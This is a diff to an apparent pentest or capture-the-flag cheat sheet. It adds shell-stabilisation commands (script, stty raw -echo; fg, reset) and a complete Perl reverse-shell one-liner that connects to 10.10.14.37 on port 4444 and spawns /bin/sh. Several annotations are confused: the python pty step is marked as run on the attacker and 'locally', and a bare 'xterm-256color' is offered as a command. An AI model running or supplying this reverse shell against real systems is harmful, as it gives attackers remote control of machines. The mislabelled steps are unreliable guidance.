@@ -7,3 +7,28 @@ alias ll='ls -lsaht --color=auto'
 Ctrl + Z [Background Process]
 stty raw -echo ; fg ; reset
 stty columns 200 rows 200
+
+
+
+# on target (run from your existing shell)
+script -qc /bin/bash /dev/null
+# then on your listener side press Ctrl+Z, then in the shell that started the listener run:
+stty raw -echo; fg
+# finally run locally in your terminal:
+reset
+export TERM=xterm-256color
+or
+xterm-256color
+
+
+
+if script requires a filename
+script /dev/null -c bash
+
+
+
+perl -e 'use Socket;$i="10.10.14.37";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+# on attacker, after receiving shell
+python -c 'import pty; pty.spawn("/bin/bash")'   # only if you have python locally
+# or use the `stty raw -echo; fg; reset` sequence if you background the shell
